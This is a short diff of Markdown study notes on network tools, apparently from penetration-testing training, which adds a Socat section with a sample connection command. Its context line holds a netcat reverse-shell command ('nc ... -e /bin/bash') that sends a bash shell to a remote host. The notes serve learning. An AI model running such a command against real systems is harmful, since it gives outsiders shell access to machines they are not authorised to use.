@@ -142,4 +142,7 @@ nc -nv {Destination IP} {Destination port} -e /bin/bash
 > 成功在 Windows 上遠端執行 Kali command
 
 ## Socat
-
+Socat is a command-line utility that establishes bidirectional byte streams and transfers data between them.
+```
+socat - TCP4:10.11.0.22:110
+```
